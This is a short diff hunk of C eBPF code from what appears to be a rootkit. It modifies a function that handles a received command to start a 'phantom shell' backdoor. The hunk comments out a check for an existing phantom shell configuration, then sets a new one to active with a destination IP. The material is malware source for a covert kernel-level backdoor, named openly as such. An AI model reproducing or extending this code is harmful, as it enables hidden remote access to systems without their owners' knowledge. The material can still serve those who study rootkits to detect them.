@@ -29,10 +29,10 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
             bpf_printk("Received request to start phantom shell\n");
             //Check for phantom shell state
             __u64 key = 1;
-            struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
-            if(ps_data != (void*)0 && ps_data->active ==1){
+            //struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
+            /*if(ps_data != (void*)0 && ps_data->active ==1){
                 bpf_printk("Overwriting previous phantom shell config\n");
-            }
+            }*/
             struct backdoor_phantom_shell_data ps_new_data = {0};
             ps_new_data.active = 1;
             ps_new_data.d_ip  = ip;
